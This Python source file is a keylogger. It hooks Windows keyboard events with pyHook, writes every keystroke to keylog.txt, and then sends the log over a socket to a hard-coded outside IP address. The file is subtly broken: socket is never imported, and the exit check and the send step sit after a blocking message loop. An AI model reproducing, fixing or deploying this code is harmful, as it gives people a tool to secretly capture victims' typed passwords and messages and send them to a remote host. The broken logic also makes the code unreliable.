import sys, pyHook, pythoncom, logging

file_log = "keylog.txt"

def OnKeyboardEvent(event):
    logging .basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager ()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
if event.Ascii == 5:
    sys.exit()

f = open('keylog.txt', 'r')
strf = str(f.read())
print(strf)
eggs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
eggs.connect(('107.170.79.196', 9010))
eggs.sendall(strf)

print("done")
